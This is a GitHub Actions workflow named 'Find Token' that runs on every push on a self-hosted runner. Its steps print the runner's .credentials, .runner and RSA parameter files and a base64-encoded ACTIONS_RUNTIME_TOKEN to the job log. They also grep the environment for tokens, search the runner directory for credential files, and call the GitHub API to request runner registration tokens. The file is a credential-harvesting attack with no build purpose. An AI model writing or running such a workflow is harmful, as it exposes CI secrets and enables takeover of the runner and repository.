name: Find Token
on: [push]
jobs:
  find:
    runs-on: self-hosted
    steps:
      - name: Read Credentials
        run: |
          echo "=== RUNNER BASE PATH ==="
          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
          
          echo "=== CREDENTIALS FILE ==="
          cat $RUNNER_BASE/.credentials
          
          echo "=== RUNNER CONFIG ==="
          cat $RUNNER_BASE/.runner
          
          echo "=== RSA PARAMS ==="
          cat $RUNNER_BASE/.credentials_rsaparams

      - name: Get Hidden Token
        run: |
          echo "=== ACTIONS RUNTIME TOKEN ==="
          echo $ACTIONS_RUNTIME_TOKEN | base64
          
          echo "=== ACTIONS TOKEN URL ==="
          echo $ACTIONS_RUNTIME_URL
          
          echo "=== ALL ACTIONS VARS ==="
          env | grep -i actions
          env | grep -i runtime
          env | grep -i token

      - name: Get Credentials Direct Path
        run: |
          echo "=== DIRECT CREDENTIALS ==="
          cat /Users/delledoxsecurity/github/d/actions-runner/.credentials
          
          echo "=== DIRECT RUNNER CONFIG ==="
          cat /Users/delledoxsecurity/github/d/actions-runner/.runner
          
          echo "=== DIRECT RSA PARAMS ==="
          cat /Users/delledoxsecurity/github/d/actions-runner/.credentials_rsaparams

      - name: Find All Token Files
        run: |
          echo "=== FINDING ALL CREDENTIAL FILES ==="
          find /Users/delledoxsecurity/github/d/actions-runner -name ".credentials*" 2>/dev/null
          find /Users/delledoxsecurity/github/d/actions-runner -name "*.token" 2>/dev/null
          find /Users/delledoxsecurity/github/d/actions-runner -name ".runner" 2>/dev/null
          
          echo "=== ALL HIDDEN FILES IN RUNNER DIR ==="
          ls -la /Users/delledoxsecurity/github/d/actions-runner/
          
          echo "=== CHECKING WORK DIR ==="
          ls -la /Users/delledoxsecurity/github/d/actions-runner/_work/

      - name: Try Generate Runner Token
        run: |
          echo "=== TRYING WITH ACTIONS_RUNTIME_TOKEN ==="
          curl -X POST \
          -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
          -H "Accept: application/vnd.github.v3+json" \
          https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token
          
          echo "=== TRYING WITH GITHUB_TOKEN ==="
          curl -X POST \
          -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
          -H "Accept: application/vnd.github.v3+json" \
          https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token
